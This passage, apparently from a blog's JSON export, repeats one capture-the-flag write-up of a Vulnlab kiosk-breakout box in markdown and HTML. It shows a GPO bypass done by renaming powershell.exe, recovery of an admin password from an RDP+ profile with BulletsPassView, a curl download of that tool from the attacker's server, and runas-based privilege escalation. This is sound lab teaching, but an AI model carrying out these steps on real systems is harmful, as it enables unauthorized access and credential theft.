machine.\n\n![](/images/vulnlab/escape-vl/m.jpg)\n\nAs noted above, the root flag is within `C:\\Users\\Administrator\\Desktop\\root.txt`, meaning we have successfully rooted this machine!\n\n# Conclusion\n\nThis box specifically was really fun, as it relied solely on your thinking as to what you can access. It also limited our Kali usage, which seemed like a new breath of fresh air (though I really am ready to use Kali again!). Big thanks to xct and kozie for the development of it, it definitely helped me to think outside the box!\n\n# Resources\n\nhttps://www.nirsoft.net/utils/bullets_password_view.html\nhttps://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp\nhttps://book.hacktricks.xyz/hardware-physical-access/escaping-from-gui-applications\nhttps://www.secquest.co.uk/white-papers/introduction-to-kiosk-breakout","source":"_posts/escape.md","raw":"---\ntitle: Escape - Vulnlab\ndate: 2024-06-05 01:58:49\ntags: [vulnlab, Easy]\ncategories: vulnlab\nkeywords: 'Vulnlab, Easy, Windows'\ndescription: This box was really creative, and involved a Kiosk breakout with the only port being 3389. When I initially started this, I was going into it relatively blind. The attack path is more so up to interpretation and really get's you thinking into understanding what you have access to and exploiting it.\ncover: /images/vulnlab/escape-vl/escape_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nThis box was really creative, and involved a Kiosk breakout with the only port being 3389. When I initially started this, I was going into it relatively blind. The attack path is more so up to interpretation and really get's you thinking into understanding what you have access to and exploiting it.\n\n# Enumeration\n\nWith that being said, let's start with our initial NMAP scan. Given that just RDP is on this machine, I'll run an aggressive scan immediately so that we can get the DNS information for our host file.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 21:28 EDT\nNmap scan report for 10.10.105.242\nHost is up (0.10s latency).\nNot shown: 999 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| ssl-cert: Subject: commonName=Escape\n| Not valid before: 2024-02-02T11:08:33\n|_Not valid after:  2024-08-03T11:08:33\n| rdp-ntlm-info: \n|   Target_Name: ESCAPE\n|   NetBIOS_Domain_Name: ESCAPE\n|   NetBIOS_Computer_Name: ESCAPE\n|   DNS_Domain_Name: Escape\n|   DNS_Computer_Name: Escape\n|   Product_Version: 10.0.19041\n|_  System_Time: 2024-05-30T01:29:15+00:00\n|_ssl-date: 2024-05-30T01:29:20+00:00; +2s from scanner time.\n```\n\nThere's not much for us to enumerate, aside from attempting to RDP to the machine. We can do so with either `remmina`, `xfreerdp`, or `rdesktop`. I'll use `rdesktop` since I'm aware that you can authenticate with null credentials easy using that tool.\n\n# Restricted Kiosk Access\n\n```\n└─$ rdesktop -u DaZ 10.10.105.242\n[...snip...]\nDo you trust this certificate (yes/no)? yes\n```\n\n![](/images/vulnlab/escape-vl/b.jpg)\n\nGiven the result of the conference display, we are told to authenticate to this machine with the user `KioskUser0` without a password. We'll use `xfreerdp /v:10.10.105.242 /u:KioskUser0` to authenticate to this machine properly.\n\nOnce we login with the above command, we can see we are greeted with the home screen of a kiosk.\n\n![](/images/vulnlab/escape-vl/c.jpg)\n\nThere doesn't seem to be anything within our desktop interface, though we can access the Start Menu by pressing our home key.\n\nAnother thing you'll notice is that the interface is entirely in Korean, which is probably not an issue for some people (but I myself can't speak Korean). I tried changing this in the Language settings, which you can access from the search bar in the Start Menu. The only pre-req is that you'll need to either restart the machine or cause the current user to sign-out, which I do not believe we can accomplish until we get code execution.\n\nAt this point it's just a matter of messing around with what we can do - I found that there aren't any pertinent settings that we can change on the machine nor can we access cmd/PowerShell.\n\n![](/images/vulnlab/escape-vl/d.jpg)\n\nThere looks to be some form of policy that is disallowing us from access a lot of the machine's main resources, even File Explorer. I ended up downloading Google Translate on my phone and taking a picture of this, it seems the message says `\"Cannot open 'C:\\Windows\\System32'. Your organization has blocked you.\"`. I'm guessing that there is a GPO preventing us from accessing this specific folder and all of it's resources.\n\nSo let's do some thinking here - we're not able to access any resources in System32 which is preventing us from doing the majority of the legwork needed to get code execution. Without this we can't really get far into the kiosk. We also won't be able to access the File Explorer regularly since `iexplorer.exe` is within this folder.\n\n# Bypass using Installed Programs\n\nThat being said, there are other resources that we can access that are not in this specific folder that might help us. If search up `Apps & Features`, we can see applications such as Cortana, Paint, and a variety of O365 tools.\n\nYou'll notice though that Microsoft Edge is also here, which is the built-in browser for this machine that is installed automatically. The binary is denoted as `msedge.exe`, and can be found in `C:\\Program Files (x86)\\Microsoft\\Edge\\Application`. Since this binary isn't usually in System32, we should be able to access it if the GPO doesn't restrict it.\n\n\n![](/images/vulnlab/escape-vl/e.jpg)\n\nAfter accepting a few Edge first-launch parameters, we're greeted with the home-page for Edge.\n\nImmediately the first thing that came to me was the URL path. Right now, it seems that we are within `edge://welcome`, which is probably a landing page for Microsoft Edge within the contents of its directory. \n\nWhat's stopping us from altering this though? If we change the identifier to `file://` and change the file location, it shouldn't exempt us from accessing resources. This is because we're not trying to access directories in the context of `KioskUser0`, but instead as the user agent for Edge.\n\n![](/images/vulnlab/escape-vl/f.jpg)\n\nThis seemed to work! We should be able to access the entirety of the kiosk's filesystem through as the Edge user agent, meaning we can also technically read the first flag right now without getting code execution.\n\nThe file path for the first user flag can be denoted below.\n\n```\n(file:///C:/Users/kioskUser0/Desktop/user_07eb46.txt)\n```\n\nWhile this is great for showing how fast we were able to get the user flag, we still need to get code execution in some way. This involves a little more messing around with in terms of what we have access to - but our range of options should open up now that we have access to the System32 folder.\n\n# Misconfigured Policy Abuse\n\nOne thing to mention, you'll notice that if you try to access any binaries or executables, it will download them locally to your user's Download folder (excluding text files like the user flag). I'll start with trying to mess around with the `cmd.exe` and `powershell.exe` binaries.\n\nI managed to find a solution really quickly, which revolved around both of these binaries. If you try to download them, they'll pop-up with a warning (due to the filename being abnormal to Edge, it's a binary after all). Selecting the left option that pops-up will download the file to the `KioskUser0`'s download directory in their home folder.\n\n![](/images/vulnlab/escape-vl/g.jpg)\n\nYou can access this specific location within the filesystem by right-clicking on the binary and/or pressing the small folder icon that appears in the drop-down menu.\n\n![](/images/vulnlab/escape-vl/h.jpg)\n\nNot only are we able to access the file explorer now, but we can interact with this binary to potentially actually get code execution. You can do this with `cmd.exe` too, it's honestly up to your preference. If you try to execute this file, it will be blocked by the GPO and will prevent you from executing the binary and spawning a PowerShell session.\n\nNow let's think - the GPO itself is blocking all files that are ran within the System32 folder or that have the same name as the binaries that are within that folder (with what know so far). While the files themselves can have their signatures also blocked (essentially meaning all files that have application signatures or icons similar to applications like `powershell` or `cmd.exe`), we don't exactly know if that's true right now.\n\nHowever, if the GPO only relies on the name of the binary in order to block access, then we can probably change the name of the binary and run it in the context of a binary that is accepted. Let's take `msedge.exe` for example since we know we were able to access that when trying to open Edge. I'll change the name of the file to `msedge` by pressing `F2` after clicking on the binary once.\n\n![](/images/vulnlab/escape-vl/i.jpg)\n\nAfter opening the file, it seems like we were able to open up a PowerShell window! This means our theory from before was correct, the GPO is only blocking binaries that share a name with a binary in System32.\n\nNow that we have code execution, we would normally read the user flag now if we didn't view it earlier.\n\n# Privilege Escalation to Administrator\n\nNow that we have a PowerShell session, let's look for other users we can potentially exploit.\n\n```\n    Directory: C:\\Users\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----          2/3/2024   2:39 AM                admin\nd-----          2/3/2024   3:44 AM                Administrator\nd-----          2/3/2024   3:12 AM                DefaultAppPool\nd-----          2/3/2024   3:10 AM                kioskUser0\nd-r---          2/3/2024   2:38 AM                Public\n```\n\nIt seems that the only other user that we can potentially pivot to is either `admin` or `Administrator`. The other two profiles we can ignore as they're default users.\n\nThe `admin` user seems to be odd, as this is not a common account name. We can assume that this is the admin of the kiosk, in which is the user we are trying to escalate to. Before we try anything, let's see if we have any privileges that we can exploit.\n\n```\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                          State\n============================= ==================================== ========\nSeShutdownPrivilege           Shut down the system                 Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking             Enabled\nSeUndockPrivilege             Remove computer from docking station Disabled\nSeIncreaseWorkingSetPrivilege Increase a process working set       Disabled\nSeTimeZonePrivilege           Change the time zone                 Disabled\n```\n\nWe don't seem to have any privileges that we can exploit, as these are relatively common privileges given to regular users.\n\nSo let's think - we don't have any privileges that we can exploit, there's only one user we can escalate to, there are no DPAPI credentials in `kioskUser0`'s home directory, and there isn't Active Directory enabled on this machine so we can't pivot to another domain user. This has to mean that there is a binary present on the machine that we can exploit in some way.\n\nI did some digging into the filesystem and found an interesting file within the root `C:\\` drive on the filesystem.\n\n```\nPS C:\\> Get-ChildItem . -Force\n\n\n    Directory: C:\\\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n[...snip...]\nd--h--          2/3/2024   3:05 AM                _admin\n[...snip...]\n```\n\nThis directory is also abnormal and isn't installed by default. Accessing this directory will lead you to two interesting files/directories, being `passwords` and `profiles.xml`\n\nDoing some more digging, it doesn't seem that `passwords` has much, though there does seem to be enticing information within the XML file.\n\n```\nPS C:\\_admin> cat profiles.xml\n<?xml version=\"1.0\" encoding=\"utf-16\"?>\n<!-- Remote Desktop Plus -->\n<Data>\n  <Profile>\n    <ProfileName>admin</ProfileName>\n    <UserName>127.0.0.1</UserName>\n    <Password>JWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=</Password>\n    <Secure>False</Secure>\n  </Profile>\n</Data>\n```\n\nThis seems to be a user hash for the `admin` user, we can try to crack this with `JTR` or `Hashcat` however I couldn't find much success as they both could not recognize the hash. You'd think it's base64 encoded given the `=`, however I found that to not be true.\n\nThis file does belong to `Remote Desktop Plus`, which is not a normal application present on this machine. If we type in `rdp` into the search bar in the Start Menu, it looks like the application is installed already.\n\n# Reading Plaintext Passwords with BPV\n\nThough we aren't able to open it from here, we should be able to access the binary from within the PowerShell window we have right now. It's within `C:\\Program Files(x86)\\Remote Desktop Plus`.\n\n![](/images/vulnlab/escape-vl/j.jpg)\n\nI did some research into RDP+, there doesn't like anything that we can exploit in particular, and the initial window doesn't seem to have any important information.\n\nThat is until I realized the one thing we can do, which is within `Manage profiles...`. We don't have any profiles at first in the window that pops up, but it does allow us to import profiles based on a respective profile file. We did have one before for the `admin` user, so let's try to import that. Note that you'll need to move the `profiles.xml` file to a place you can actually access, which I moved to the `Downloads` folder and then imported from there.\n\n![](/images/vulnlab/escape-vl/k.jpg)\n\nNow that we imported the profile - we can see that RDP+ displays the password in bulleted-text. This means that the plaintext password must've been loaded into the application, as the length has shrunk immensely (in comparison to the hash).\n\nNow that we have the password technically on our screen, we can use a tool that isn't commonly used on machines for red-teaming - [BulletsPassView](https://www.nirsoft.net/utils/bullets_password_view.html). This is a password recovery tool, and is used to reveal passwords that are stored behind bullets in a regular text-box. It's used to help users who forget their passwords, and allows them to easily reveal and copy their plaintext passwords for reusage.\n\nWe'll be using this tool to help reveal the `admin` password. This specific executable isn't malicious in nature, which I'm thankful for since Defender is enabled on this kiosk. (You can test this by just running `\"Invoke-Mimikatz\"` in your PowerShell session.)\n\nAll that we'll need is a Python server on our Kali machine (we're actually using our Kali host for the first time - and we're about to root this box!) with the BPV.exe file. You can download BPV from the link I posted and start a Python server with `python3 -m http.server (PORT)`.\n\nAfter that's finished, we'll use cURL to download the executable to the kiosk `curl http://(KALI IP):(PORT)/BuletsPassView.exe -O BPV.exe`. We can then run the binary and the application should load. (Note, make sure to download the x64-bit version so it can properly detect RDP+)\n\n![](/images/vulnlab/escape-vl/l.jpg)\n\nIf you have both RDP+ and BPV opened, upon refreshing you should see the password in plaintext. This means we can now escalate to this user! You can do so by just starting a new PowerShell process using `runas`.\n\n```\nPS C:\\Users\\kioskUser0\\Downloads> runas /user:ESCAPE\\admin C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n```\n\nThis should elevate us to `admin`, though you'll notice that our privileges are still the same as the `Administrator` user. We can circumvent this by doing `Start-Process powershell -verb runAs` to start up another PowerShell window in the context of the Administrator user as the `admin` user as UAC bypass enabled. If you run `whoami /priv` after this, you'll see that we are now the Administrator on the machine.\n\n![](/images/vulnlab/escape-vl/m.jpg)\n\nAs noted above, the root flag is within `C:\\Users\\Administrator\\Desktop\\root.txt`, meaning we have successfully rooted this machine!\n\n# Conclusion\n\nThis box specifically was really fun, as it relied solely on your thinking as to what you can access. It also limited our Kali usage, which seemed like a new breath of fresh air (though I really am ready to use Kali again!). Big thanks to xct and kozie for the development of it, it definitely helped me to think outside the box!\n\n# Resources\n\nhttps://www.nirsoft.net/utils/bullets_password_view.html\nhttps://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp\nhttps://book.hacktricks.xyz/hardware-physical-access/escaping-from-gui-applications\nhttps://www.secquest.co.uk/white-papers/introduction-to-kiosk-breakout","slug":"escape","published":1,"updated":"2024-06-05T20:04:37.339Z","_id":"clx1fcb3i0000w7ufc2v58hya","comments":1,"layout":"post","photos":[],"content":"<p>This box was really creative, and involved a Kiosk breakout with the only port being 3389. When I initially started this, I was going into it relatively blind. The attack path is more so up to interpretation and really get’s you thinking into understanding what you have access to and exploiting it.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>With that being said, let’s start with our initial NMAP scan. Given that just RDP is on this machine, I’ll run an aggressive scan immediately so that we can get the DNS information for our host file.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 21:28 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.105.242</span><br><span class=\"line\">Host is up (0.10s latency).</span><br><span class=\"line\">Not shown: 999 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE       VERSION</span><br><span class=\"line\">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class=\"line\">| ssl-cert: Subject: commonName=Escape</span><br><span class=\"line\">| Not valid before: 2024-02-02T11:08:33</span><br><span class=\"line\">|_Not valid after:  2024-08-03T11:08:33</span><br><span class=\"line\">| rdp-ntlm-info: </span><br><span class=\"line\">|   Target_Name: ESCAPE</span><br><span class=\"line\">|   NetBIOS_Domain_Name: ESCAPE</span><br><span class=\"line\">|   NetBIOS_Computer_Name: ESCAPE</span><br><span class=\"line\">|   DNS_Domain_Name: Escape</span><br><span class=\"line\">|   DNS_Computer_Name: Escape</span><br><span class=\"line\">|   Product_Version: 10.0.19041</span><br><span class=\"line\">|_  System_Time: 2024-05-30T01:29:15+00:00</span><br><span class=\"line\">|_ssl-date: 2024-05-30T01:29:20+00:00; +2s from scanner time.</span><br></pre></td></tr></table></figure>\n\n<p>There’s not much for us to enumerate, aside from attempting to RDP to the machine. We can do so with either <code>remmina</code>, <code>xfreerdp</code>, or <code>rdesktop</code>. I’ll use <code>rdesktop</code> since I’m aware that you can authenticate with null credentials easy using that tool.</p>\n<h1 id=\"Restricted-Kiosk-Access\"><a href=\"#Restricted-Kiosk-Access\" class=\"headerlink\" title=\"Restricted Kiosk Access\"></a>Restricted Kiosk Access</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ rdesktop -u DaZ 10.10.105.242</span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\">Do you trust this certificate (yes/no)? yes</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/vulnlab/escape-vl/b.jpg\"></p>\n<p>Given the result of the conference display, we are told to authenticate to this machine with the user <code>KioskUser0</code> without a password. We’ll use <code>xfreerdp /v:10.10.105.242 /u:KioskUser0</code> to authenticate to this machine properly.</p>\n<p>Once we login with the above command, we can see we are greeted with the home screen of a kiosk.</p>\n<p><img src=\"/images/vulnlab/escape-vl/c.jpg\"></p>\n<p>There doesn’t seem to be anything within our desktop interface, though we can access the Start Menu by pressing our home key.</p>\n<p>Another thing you’ll notice is that the interface is entirely in Korean, which is probably not an issue for some people (but I myself can’t speak Korean). I tried changing this in the Language settings, which you can access from the search bar in the Start Menu. The only pre-req is that you’ll need to either restart the machine or cause the current user to sign-out, which I do not believe we can accomplish until we get code execution.</p>\n<p>At this point it’s just a matter of messing around with what we can do - I found that there aren’t any pertinent settings that we can change on the machine nor can we access cmd&#x2F;PowerShell.</p>\n<p><img src=\"/images/vulnlab/escape-vl/d.jpg\"></p>\n<p>There looks to be some form of policy that is disallowing us from access a lot of the machine’s main resources, even File Explorer. I ended up downloading Google Translate on my phone and taking a picture of this, it seems the message says <code>&quot;Cannot open &#39;C:\\Windows\\System32&#39;. Your organization has blocked you.&quot;</code>. I’m guessing that there is a GPO preventing us from accessing this specific folder and all of it’s resources.</p>\n<p>So let’s do some thinking here - we’re not able to access any resources in System32 which is preventing us from doing the majority of the legwork needed to get code execution. Without this we can’t really get far into the kiosk. We also won’t be able to access the File Explorer regularly since <code>iexplorer.exe</code> is within this folder.</p>\n<h1 id=\"Bypass-using-Installed-Programs\"><a href=\"#Bypass-using-Installed-Programs\" class=\"headerlink\" title=\"Bypass using Installed Programs\"></a>Bypass using Installed Programs</h1><p>That being said, there are other resources that we can access that are not in this specific folder that might help us. If search up <code>Apps &amp; Features</code>, we can see applications such as Cortana, Paint, and a variety of O365 tools.</p>\n<p>You’ll notice though that Microsoft Edge is also here, which is the built-in browser for this machine that is installed automatically. The binary is denoted as <code>msedge.exe</code>, and can be found in <code>C:\\Program Files (x86)\\Microsoft\\Edge\\Application</code>. Since this binary isn’t usually in System32, we should be able to access it if the GPO doesn’t restrict it.</p>\n<p><img src=\"/images/vulnlab/escape-vl/e.jpg\"></p>\n<p>After accepting a few Edge first-launch parameters, we’re greeted with the home-page for Edge.</p>\n<p>Immediately the first thing that came to me was the URL path. Right now, it seems that we are within <code>edge://welcome</code>, which is probably a landing page for Microsoft Edge within the contents of its directory. </p>\n<p>What’s stopping us from altering this though? If we change the identifier to <code>file://</code> and change the file location, it shouldn’t exempt us from accessing resources. This is because we’re not trying to access directories in the context of <code>KioskUser0</code>, but instead as the user agent for Edge.</p>\n<p><img src=\"/images/vulnlab/escape-vl/f.jpg\"></p>\n<p>This seemed to work! We should be able to access the entirety of the kiosk’s filesystem through as the Edge user agent, meaning we can also technically read the first flag right now without getting code execution.</p>\n<p>The file path for the first user flag can be denoted below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(file:///C:/Users/kioskUser0/Desktop/user_07eb46.txt)</span><br></pre></td></tr></table></figure>\n\n<p>While this is great for showing how fast we were able to get the user flag, we still need to get code execution in some way. This involves a little more messing around with in terms of what we have access to - but our range of options should open up now that we have access to the System32 folder.</p>\n<h1 id=\"Misconfigured-Policy-Abuse\"><a href=\"#Misconfigured-Policy-Abuse\" class=\"headerlink\" title=\"Misconfigured Policy Abuse\"></a>Misconfigured Policy Abuse</h1><p>One thing to mention, you’ll notice that if you try to access any binaries or executables, it will download them locally to your user’s Download folder (excluding text files like the user flag). I’ll start with trying to mess around with the <code>cmd.exe</code> and <code>powershell.exe</code> binaries.</p>\n<p>I managed to find a solution really quickly, which revolved around both of these binaries. If you try to download them, they’ll pop-up with a warning (due to the filename being abnormal to Edge, it’s a binary after all). Selecting the left option that pops-up will download the file to the <code>KioskUser0</code>‘s download directory in their home folder.</p>\n<p><img src=\"/images/vulnlab/escape-vl/g.jpg\"></p>\n<p>You can access this specific location within the filesystem by right-clicking on the binary and&#x2F;or pressing the small folder icon that appears in the drop-down menu.</p>\n<p><img src=\"/images/vulnlab/escape-vl/h.jpg\"></p>\n<p>Not only are we able to access the file explorer now, but we can interact with this binary to potentially actually get code execution. You can do this with <code>cmd.exe</code> too, it’s honestly up to your preference. If you try to execute this file, it will be blocked by the GPO and will prevent you from executing the binary and spawning a PowerShell session.</p>\n<p>Now let’s think - the GPO itself is blocking all files that are ran within the System32 folder or that have the same name as the binaries that are within that folder (with what know so far). While the files themselves can have their signatures also blocked (essentially meaning all files that have application signatures or icons similar to applications like <code>powershell</code> or <code>cmd.exe</code>), we don’t exactly know if that’s true right now.</p>\n<p>However, if the GPO only relies on the name of the binary in order to block access, then we can probably change the name of the binary and run it in the context of a binary that is accepted. Let’s take <code>msedge.exe</code> for example since we know we were able to access that when trying to open Edge. I’ll change the name of the file to <code>msedge</code> by pressing <code>F2</code> after clicking on the binary once.</p>\n<p><img src=\"/images/vulnlab/escape-vl/i.jpg\"></p>\n<p>After opening the file, it seems like we were able to open up a PowerShell window! This means our theory from before was correct, the GPO is only blocking binaries that share a name with a binary in System32.</p>\n<p>Now that we have code execution, we would normally read the user flag now if we didn’t view it earlier.</p>\n<h1 id=\"Privilege-Escalation-to-Administrator\"><a href=\"#Privilege-Escalation-to-Administrator\" class=\"headerlink\" title=\"Privilege Escalation to Administrator\"></a>Privilege Escalation to Administrator</h1><p>Now that we have a PowerShell session, let’s look for other users we can potentially exploit.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">    Directory: C:\\Users</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">d-----          2/3/2024   2:39 AM                admin</span><br><span class=\"line\">d-----          2/3/2024   3:44 AM                Administrator</span><br><span class=\"line\">d-----          2/3/2024   3:12 AM                DefaultAppPool</span><br><span class=\"line\">d-----          2/3/2024   3:10 AM                kioskUser0</span><br><span class=\"line\">d-r---          2/3/2024   2:38 AM                Public</span><br></pre></td></tr></table></figure>\n\n<p>It seems that the only other user that we can potentially pivot to is either <code>admin</code> or <code>Administrator</code>. The other two profiles we can ignore as they’re default users.</p>\n<p>The <code>admin</code> user seems to be odd, as this is not a common account name. We can assume that this is the admin of the kiosk, in which is the user we are trying to escalate to. Before we try anything, let’s see if we have any privileges that we can exploit.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PRIVILEGES INFORMATION</span><br><span class=\"line\">----------------------</span><br><span class=\"line\"></span><br><span class=\"line\">Privilege Name                Description                          State</span><br><span class=\"line\">============================= ==================================== ========</span><br><span class=\"line\">SeShutdownPrivilege           Shut down the system                 Disabled</span><br><span class=\"line\">SeChangeNotifyPrivilege       Bypass traverse checking             Enabled</span><br><span class=\"line\">SeUndockPrivilege             Remove computer from docking station Disabled</span><br><span class=\"line\">SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled</span><br><span class=\"line\">SeTimeZonePrivilege           Change the time zone                 Disabled</span><br></pre></td></tr></table></figure>\n\n<p>We don’t seem to have any privileges that we can exploit, as these are relatively common privileges given to regular users.</p>\n<p>So let’s think - we don’t have any privileges that we can exploit, there’s only one user we can escalate to, there are no DPAPI credentials in <code>kioskUser0</code>‘s home directory, and there isn’t Active Directory enabled on this machine so we can’t pivot to another domain user. This has to mean that there is a binary present on the machine that we can exploit in some way.</p>\n<p>I did some digging into the filesystem and found an interesting file within the root <code>C:\\</code> drive on the filesystem.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\&gt; Get-ChildItem . -Force</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    Directory: C:\\</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\">d--h--          2/3/2024   3:05 AM                _admin</span><br><span class=\"line\">[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>This directory is also abnormal and isn’t installed by default. Accessing this directory will lead you to two interesting files&#x2F;directories, being <code>passwords</code> and <code>profiles.xml</code></p>\n<p>Doing some more digging, it doesn’t seem that <code>passwords</code> has much, though there does seem to be enticing information within the XML file.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\_admin&gt; cat profiles.xml</span><br><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-16&quot;?&gt;</span><br><span class=\"line\">&lt;!-- Remote Desktop Plus --&gt;</span><br><span class=\"line\">&lt;Data&gt;</span><br><span class=\"line\">  &lt;Profile&gt;</span><br><span class=\"line\">    &lt;ProfileName&gt;admin&lt;/ProfileName&gt;</span><br><span class=\"line\">    &lt;UserName&gt;127.0.0.1&lt;/UserName&gt;</span><br><span class=\"line\">    &lt;Password&gt;JWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=&lt;/Password&gt;</span><br><span class=\"line\">    &lt;Secure&gt;False&lt;/Secure&gt;</span><br><span class=\"line\">  &lt;/Profile&gt;</span><br><span class=\"line\">&lt;/Data&gt;</span><br></pre></td></tr></table></figure>\n\n<p>This seems to be a user hash for the <code>admin</code> user, we can try to crack this with <code>JTR</code> or <code>Hashcat</code> however I couldn’t find much success as they both could not recognize the hash. You’d think it’s base64 encoded given the <code>=</code>, however I found that to not be true.</p>\n<p>This file does belong to <code>Remote Desktop Plus</code>, which is not a normal application present on this machine. If we type in <code>rdp</code> into the search bar in the Start Menu, it looks like the application is installed already.</p>\n<h1 id=\"Reading-Plaintext-Passwords-with-BPV\"><a href=\"#Reading-Plaintext-Passwords-with-BPV\" class=\"headerlink\" title=\"Reading Plaintext Passwords with BPV\"></a>Reading Plaintext Passwords with BPV</h1><p>Though we aren’t able to open it from here, we should be able to access the binary from within the PowerShell window we have right now. It’s within <code>C:\\Program Files(x86)\\Remote Desktop Plus</code>.</p>\n<p><img src=\"/images/vulnlab/escape-vl/j.jpg\"></p>\n<p>I did some research into RDP+, there doesn’t like anything that we can exploit in particular, and the initial window doesn’t seem to have any important information.</p>\n<p>That is until I realized the one thing we can do, which is within <code>Manage profiles...</code>. We don’t have any profiles at first in the window that pops up, but it does allow us to import profiles based on a respective profile file. We did have one before for the <code>admin</code> user, so let’s try to import that. Note that you’ll need to move the <code>profiles.xml</code> file to a place you can actually access, which I moved to the <code>Downloads</code> folder and then imported from there.</p>\n<p><img src=\"/images/vulnlab/escape-vl/k.jpg\"></p>\n<p>Now that we imported the profile - we can see that RDP+ displays the password in bulleted-text. This means that the plaintext password must’ve been loaded into the application, as the length has shrunk immensely (in comparison to the hash).</p>\n<p>Now that we have the password technically on our screen, we can use a tool that isn’t commonly used on machines for red-teaming - <a href=\"https://www.nirsoft.net/utils/bullets_password_view.html\">BulletsPassView</a>. This is a password recovery tool, and is used to reveal passwords that are stored behind bullets in a regular text-box. It’s used to help users who forget their passwords, and allows them to easily reveal and copy their plaintext passwords for reusage.</p>\n<p>We’ll be using this tool to help reveal the <code>admin</code> password. This specific executable isn’t malicious in nature, which I’m thankful for since Defender is enabled on this kiosk. (You can test this by just running <code>&quot;Invoke-Mimikatz&quot;</code> in your PowerShell session.)</p>\n<p>All that we’ll need is a Python server on our Kali machine (we’re actually using our Kali host for the first time - and we’re about to root this box!) with the BPV.exe file. You can download BPV from the link I posted and start a Python server with <code>python3 -m http.server (PORT)</code>.</p>\n<p>After that’s finished, we’ll use cURL to download the executable to the kiosk <code>curl http://(KALI IP):(PORT)/BuletsPassView.exe -O BPV.exe</code>. We can then run the binary and the application should load. (Note, make sure to download the x64-bit version so it can properly detect RDP+)</p>\n<p><img src=\"/images/vulnlab/escape-vl/l.jpg\"></p>\n<p>If you have both RDP+ and BPV opened, upon refreshing you should see the password in plaintext. This means we can now escalate to this user! You can do so by just starting a new PowerShell process using <code>runas</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\kioskUser0\\Downloads&gt; runas /user:ESCAPE\\admin C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</span><br></pre></td></tr></table></figure>\n\n<p>This should elevate us to <code>admin</code>, though you’ll notice that our privileges are still the same as the <code>Administrator</code> user. We can circumvent this by doing <code>Start-Process powershell -verb runAs</code> to start up another PowerShell window in the context of the Administrator user as the <code>admin</code> user as UAC bypass enabled. If you run <code>whoami /priv</code> after this, you’ll see that we are now the Administrator on the machine.</p>\n<p><img src=\"/images/vulnlab/escape-vl/m.jpg\"></p>\n<p>As noted above, the root flag is within <code>C:\\Users\\Administrator\\Desktop\\root.txt</code>, meaning we have successfully rooted this machine!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This box specifically was really fun, as it relied solely on your thinking as to what you can access. It also limited our Kali usage, which seemed like a new breath of fresh air (though I really am ready to use Kali again!). Big thanks to xct and kozie for the development of it, it definitely helped me to think outside the box!</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://www.nirsoft.net/utils/bullets_password_view.html\">https://www.nirsoft.net/utils/bullets_password_view.html</a><br><a href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp\">https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp</a><br><a href=\"https://book.hacktricks.xyz/hardware-physical-access/escaping-from-gui-applications\">https://book.hacktricks.xyz/hardware-physical-access/escaping-from-gui-applications</a><br><a href=\"https://www.secquest.co.uk/white-papers/introduction-to-kiosk-breakout\">https://www.secquest.co.uk/white-papers/introduction-to-kiosk-breakout</a></p>\n","cover_type":"img","excerpt":"","more":"<p>This box was really creative, and involved a Kiosk breakout with the only port being 3389. When I initially started this, I was going into it relatively blind. The attack path is more so up to interpretation and really get’s you thinking into understanding what you have access to and exploiting it.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>With that being said, let’s start with our initial NMAP scan. Given that just RDP is on this machine, I’ll run an aggressive scan immediately so that we can get the DNS information for our host 